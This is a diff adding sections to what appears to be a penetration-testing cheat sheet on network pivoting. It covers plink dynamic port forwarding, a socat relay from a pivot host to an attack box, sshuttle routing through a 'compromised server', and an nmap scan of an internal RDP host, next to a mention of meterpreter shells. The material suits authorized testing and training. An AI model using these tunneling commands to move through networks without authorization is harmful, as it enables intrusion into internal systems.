@@ -141,6 +141,32 @@ ssh <span class="nt">-R</span> &lt;internal IP of compromised ubuntu server&gt;:
 <span class="c"># you received a meterpreter shell.</span>
 </code></pre></div>
 
+<h2>port forwarding with plink (putty link) on windows</h2>
+
+<div class="highlight"><pre class="highlight powershell"><code><span class="c"># perform dynamic port forwarding with plink.</span><span class="w">
+</span><span class="c"># tools like proxifier can then use that port forwarding</span><span class="w">
+</span><span class="c"># to connect through RDP, for instance.</span><span class="w">
+</span><span class="n">plink</span><span class="w"> </span><span class="nt">-ssh</span><span class="w"> </span><span class="nt">-D</span><span class="w"> </span><span class="nx">9050</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;@&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div>
+
+<h2>socat</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># listen on pivot machine's localhost on port 8080 and forward all traffic</span>
+<span class="c"># to our attack box on port 80. the same command can be used to forward</span>
+<span class="c"># traffic from our attack box to an internal target.</span>
+socat TCP4-LISTEN:8080,fork TCP4:&lt;attack box IP | internal target IP&gt;:80
+</code></pre></div>
+
+<h2>sshuttle</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect to the pivot machine and specify a network to route</span>
+<span class="c"># by changing iptables automatically (until exiting program).</span>
+sshuttle <span class="nt">-r</span> &lt;username&gt;@&lt;compromised server IP&gt; 172.16.5.0/23 <span class="nt">-v</span> <span class="c"># can also be a single IP address</span>
+
+<span class="c"># traffic routing now works and you don't even need proxychains</span>
+nmap <span class="nt">-sV</span> <span class="nt">-p3389</span> <span class="nt">-Pn</span> 172.16.5.19
+</code></pre></div>
+
 <h2>chisel</h2>
 
 <p>for compatibility with powershell-empire, use chisel 1.7.2.</p>
